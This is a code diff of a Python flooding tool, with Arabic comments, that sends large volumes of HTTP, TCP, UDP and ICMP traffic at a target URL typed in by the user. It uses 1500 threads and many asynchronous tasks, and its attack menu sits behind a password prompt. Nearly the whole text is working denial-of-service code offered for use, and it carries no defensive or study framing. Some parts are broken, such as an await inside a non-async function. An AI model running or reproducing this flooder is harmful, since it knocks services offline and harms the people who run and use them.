@@ -10,87 +10,11 @@ from io import BytesIO
 import socket
 import os
 import ssl
+import sys
+import signal
 
 # متغير لتتبع حالة إيقاف الهجوم
 stop_attack_flag = multiprocessing.Value('b', False)
-
-def display_banner():
-    banner_text = "j"
-    for char in banner_text:
-        print(Fore.GREEN + char + Style.RESET_ALL)
-        time.sleep(0.05)
-
-def password_prompt():
-    password = input("Enter password: ")
-    if password == "j":
-        print(Fore.GREEN + "Correct password! Opening attack menu..." + Style.RESET_ALL)
-        start_attack()
-    else:
-        print(Fore.RED + "Wrong password! Exiting..." + Style.RESET_ALL)
-        exit()
-
-def send_requests_threaded(target, stop_flag):
-    session = requests.Session()
-
-    def send_request():
-        try:
-            session.get(target, timeout=5, verify=False)
-        except Exception as e:
-            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
-
-    num_threads = 1500  # استخدام 1500 خيط كحد أقصى
-    with ThreadPoolExecutor(max_workers=num_threads) as executor:
-        futures = [executor.submit(send_request) for _ in range(num_threads)]
-
-        for future in futures:
-            if stop_flag.value:
-                break
-
-async def send_requests_aiohttp(target, stop_flag):
-    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
-        try:
-            async with session.get(target, timeout=5) as response:
-                await response.text()
-        except Exception as e:
-            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
-
-def send_requests_pycurl(target, stop_flag):
-    try:
-        buffer = BytesIO()
-        c = pycurl.Curl()
-        c.setopt(c.URL, target)
-        c.setopt(c.WRITEDATA, buffer)
-        c.setopt(c.SSL_VERIFYPEER, 0)
-        c.setopt(c.SSL_VERIFYHOST, 0)
-        c.perform()
-        c.close()
-    except Exception as e:
-        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
-
-def send_requests_socket(target, stop_flag):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((target, 443))
-        sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
-        sock.close()
-    except Exception as e:
-        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
-
-def send_requests_udp(target, stop_flag):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n", (target, 443))
-        sock.close()
-    except Exception as e:
-        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
-
-def send_requests_icmp(target, stop_flag):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-        sock.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (target, 0))
-        sock.close()
-    except Exception as e:
-        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
 
 def show_attack_animation():
     print("Loading...")
@@ -154,12 +78,104 @@ def execute_attack(target):
     except:
         pass
 
+def send_requests_threaded(target, stop_flag):
+    session = requests.Session()
+
+    def send_request():
+        try:
+            session.get(target, timeout=5, verify=False)
+        except Exception as e:
+            pass
+
+    num_threads = 1500  # استخدام 1500 خيط كحد أقصى
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        futures = [executor.submit(send_request) for _ in range(num_threads)]
+
+        for future in futures:
+            if stop_flag.value:
+                break
+
+
+def send_requests_aiohttp(target, stop_flag):
+    async def send_request():
+        async with aiohttp.ClientSession() as session:
+            async with session.get(target, verify_ssl=False) as response:
+                await response.read()
+
+    tasks = [asyncio.create_task(send_request()) for _ in range(1500)]
+
+    done, pending = await asyncio.wait(tasks)
+
+    for task in pending:
+        task.cancel()
+
+def send_requests_pycurl(target, stop_flag):
+    try:
+        buffer = BytesIO()
+        c = pycurl.Curl()
+        c.setopt(c.URL, target)
+        c.setopt(c.WRITEDATA, buffer)
+        c.setopt(c.SSL_VERIFYPEER, 0)
+        c.setopt(c.SSL_VERIFYHOST, 0)
+        c.perform()
+        c.close()
+    except Exception as e:
+        pass
+
+def send_requests_socket(target, stop_flag):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((target, 443))
+        sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+        sock.close()
+    except Exception as e:
+        pass
+
+def send_requests_udp(target, stop_flag):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n", (target, 443))
+        sock.close()
+    except Exception as e:
+        pass
+
+def send_requests_icmp(target, stop_flag):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        sock.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (target, 0))
+        sock.close()
+    except Exception as e:
+        pass
+
+def show_attack_animation():
+    print("Loading...")
+
+def start_attack():
+    try:
+        password = input("Enter password: ")
+        if password == "your_password":
+            target = input("Target URL: ")
+            print("Attack will continue indefinitely. Type 'stop' to end it.")
+            execute_attack(target)
+        else:
+            print("Incorrect password.")
+    except:
+        pass
+
 def main():
     try:
-        display_banner()
         password_prompt()
     except:
         pass
+
+def password_prompt():
+    password = input("Enter password to access the attack interface: ")
+    if password == "your_password":
+        print("Access granted.")
+        start_attack()
+    else:
+        print("Incorrect password.")
+        sys.exit(0)
 
 if __name__ == "__main__":
     main()
